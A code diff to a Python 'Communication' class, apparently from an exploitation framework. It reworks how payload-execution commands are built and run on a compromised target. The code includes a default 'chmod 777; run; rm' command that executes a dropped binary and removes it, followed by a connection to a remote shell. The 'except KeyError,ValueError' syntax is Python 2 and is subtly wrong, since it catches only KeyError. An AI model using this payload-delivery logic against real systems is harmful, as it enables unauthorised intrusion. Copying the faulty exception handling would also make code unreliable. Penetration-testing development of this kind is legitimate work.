@@ -283,16 +283,19 @@ class Communication(object):
                 if isinstance(item_exec_binary, str):
                     try:
                         commands.append(item_exec_binary.format(path))
-                    except ValueError:
+                    except KeyError,ValueError:
                         commands.append(item_exec_binary)
                 elif callable(item_exec_binary):
                     commands.append(item_exec_binary(path))
 
         # instruction to execute generic payload e.g. netcat / awk
         elif isinstance(self.exec_binary, str):
-            commands.append(self.exec_binary)
+            try:
+                commands.append(self.exec_binary.format(path))
+            except KeyError,ValueError:
+                commands.append(self.exec_binary)
 
-        # default way of exectuign payload
+        # default way of executing payload
         else:
             exec_binary_str = "chmod 777 {0}; {0}; rm {0}".format(path)
             commands.append(exec_binary_str)
@@ -314,7 +317,7 @@ class Communication(object):
         for command in commands[:-1]:
             self.exploit.execute(command)
 
-        # asynchronous last command to execute binary
+        # asynchronous last command to execute binary & rm binary
         thread = threading.Thread(target=self.exploit.execute, args=(commands[-1],))
         thread.start()
 
@@ -333,9 +336,13 @@ class Communication(object):
         # execute binary
         commands = self.build_commands()
 
-        for command in commands:
-            thread = threading.Thread(target=self.exploit.execute, args=(command,))
-            thread.start()
+        # synchronized commands
+        for command in commands[:-1]:
+            self.exploit.execute(command)
+
+        # asynchronous last command to execute binary & rm binary
+        thread = threading.Thread(target=self.exploit.execute, args=(commands[-1],))
+        thread.start()
 
         # connecting to shell
         print_status("Connecting to {}:{}".format(self.options['rhost'], self.options['rport']))
